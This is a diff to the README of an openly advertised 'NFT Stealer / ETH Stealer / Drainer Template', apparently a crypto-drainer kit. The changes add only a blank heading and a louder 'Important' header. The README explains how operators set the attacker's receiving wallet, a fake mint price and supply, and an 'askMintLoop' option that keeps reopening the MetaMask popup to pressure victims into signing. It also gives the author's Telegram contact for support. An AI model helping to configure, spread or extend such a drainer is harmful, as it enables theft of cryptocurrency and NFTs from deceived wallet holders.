@@ -1,6 +1,7 @@
 ### ⚠️ My old Github [@0xAshe](https://github.com/0xAshe/Nft-Drainer-stealer) got termed, I will update the repo here
 # *⛔ Beware of scams, this is the real repo*
 ### If you need any help, DM me here: [@Zentoh](https://t.me/zentoh) (new telegram)
+### 
 
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template
 
@@ -25,7 +26,7 @@ you need to edit the **settings.js** file.
   - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
   - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.
 
-## `☁️ Important :` 
+## `☁️ Important (PLEASE READ BEFORE):` 
 
 - Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
 - Edit lines : nftReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
